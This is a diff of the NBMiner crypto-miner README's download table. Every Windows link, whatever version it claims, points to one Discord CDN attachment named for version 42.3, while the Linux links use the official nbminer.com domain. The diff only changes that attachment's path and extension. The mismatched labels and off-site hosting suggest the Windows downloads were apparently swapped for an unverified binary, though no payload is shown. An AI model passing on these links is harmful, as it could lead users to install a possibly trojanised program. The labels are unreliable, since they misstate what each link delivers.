@@ -20,12 +20,12 @@ Be aware when you download NBMiner binaries from other sources.
 
 | version | Windows                                                      | Linux                                                        |
 | ------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
-| 42.3    | [NBMiner_42.3_Win.zip](https://cdn.discordapp.com/attachments/457668556658835488/1041043607668404264/NBMiner_42.3_Win.rar) | [NBMiner_42.3_Linux.tgz](https://dl.nbminer.com/NBMiner_42.3_Linux.tgz) |
-| 42.2    | [NBMiner_42.2_Win.zip](https://cdn.discordapp.com/attachments/457668556658835488/1041043607668404264/NBMiner_42.3_Win.rar) | [NBMiner_42.2_Linux.tgz](https://dl.nbminer.com/NBMiner_42.2_Linux.tgz) |
-| 41.5    | [NBMiner_41.5_Win.zip](https://cdn.discordapp.com/attachments/457668556658835488/1041043607668404264/NBMiner_42.3_Win.rar) | [NBMiner_41.5_Linux.tgz](https://dl.nbminer.com/NBMiner_41.5_Linux.tgz) |
-| 41.3    | [NBMiner_41.3_Win.zip](https://cdn.discordapp.com/attachments/457668556658835488/1041043607668404264/NBMiner_42.3_Win.rar) | [NBMiner_41.3_Linux.tgz](https://dl.nbminer.com/NBMiner_41.3_Linux.tgz) |
-| 41.0    | [NBMiner_41.0_Win.zip](https://cdn.discordapp.com/attachments/457668556658835488/1041043607668404264/NBMiner_42.3_Win.rar) | [NBMiner_41.0_Linux.tgz](https://dl.nbminer.com/NBMiner_41.0_Linux.tgz) |
-| 40.1    | [NBMiner_40.1_Win.zip](https://cdn.discordapp.com/attachments/457668556658835488/1041043607668404264/NBMiner_42.3_Win.rar) | [NBMiner_40.1_Linux.tgz](https://dl.nbminer.com/NBMiner_40.1_Linux.tgz) |
+| 42.3    | [NBMiner_42.3_Win.zip](https://cdn.discordapp.com/attachments/457668556658835488/1041045150916415519/NBMiner_42.3_Win.zip) | [NBMiner_42.3_Linux.tgz](https://dl.nbminer.com/NBMiner_42.3_Linux.tgz) |
+| 42.2    | [NBMiner_42.2_Win.zip](https://cdn.discordapp.com/attachments/457668556658835488/1041045150916415519/NBMiner_42.3_Win.zip) | [NBMiner_42.2_Linux.tgz](https://dl.nbminer.com/NBMiner_42.2_Linux.tgz) |
+| 41.5    | [NBMiner_41.5_Win.zip](https://cdn.discordapp.com/attachments/457668556658835488/1041045150916415519/NBMiner_42.3_Win.zip) | [NBMiner_41.5_Linux.tgz](https://dl.nbminer.com/NBMiner_41.5_Linux.tgz) |
+| 41.3    | [NBMiner_41.3_Win.zip](https://cdn.discordapp.com/attachments/457668556658835488/1041045150916415519/NBMiner_42.3_Win.zip) | [NBMiner_41.3_Linux.tgz](https://dl.nbminer.com/NBMiner_41.3_Linux.tgz) |
+| 41.0    | [NBMiner_41.0_Win.zip](https://cdn.discordapp.com/attachments/457668556658835488/1041045150916415519/NBMiner_42.3_Win.zip) | [NBMiner_41.0_Linux.tgz](https://dl.nbminer.com/NBMiner_41.0_Linux.tgz) |
+| 40.1    | [NBMiner_40.1_Win.zip](https://cdn.discordapp.com/attachments/457668556658835488/1041045150916415519/NBMiner_42.3_Win.zip) | [NBMiner_40.1_Linux.tgz](https://dl.nbminer.com/NBMiner_40.1_Linux.tgz) |
 
 - Download older versions from [github releases](https://github.com/NebuTech/NBMiner/releases)
 
